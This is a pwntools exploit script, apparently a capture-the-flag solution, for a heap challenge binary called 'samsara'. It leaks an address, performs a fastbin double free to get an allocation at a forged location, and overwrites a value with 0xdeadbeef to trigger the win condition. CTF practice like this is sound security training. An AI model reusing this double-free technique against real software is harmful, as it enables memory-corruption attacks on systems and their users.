#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './samsara'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def capture():
    sla('choice > ','1')

def eat(index):
    sla('choice > ','2')
    sla('Index:\n',str(index))

def cook(index, data):
    sla('choice > ','3')
    sla('Index:\n',str(index))
    sla('Ingredient:\n',str(data))

def show():
    sla('choice > ','4')
    ru('Your lair is at: ')
    return eval(rc(14))

def move(data):
    sla('choice > ','5')
    sla('Which kingdom?\n',str(data))

def commit():
    sla('choice > ','6')

ptr = show()
info_addr('ptr',ptr)
move(0x21)

capture() # 0
capture() # 1
capture() # 2

eat(0)
eat(1)
eat(0)

# debug()
capture()   # 3
cook(0,ptr-0x8) 
capture()   # 4
capture()   # 5 
capture()   # 6 
cook(6,0xdeadbeef)

commit()

p.interactive()
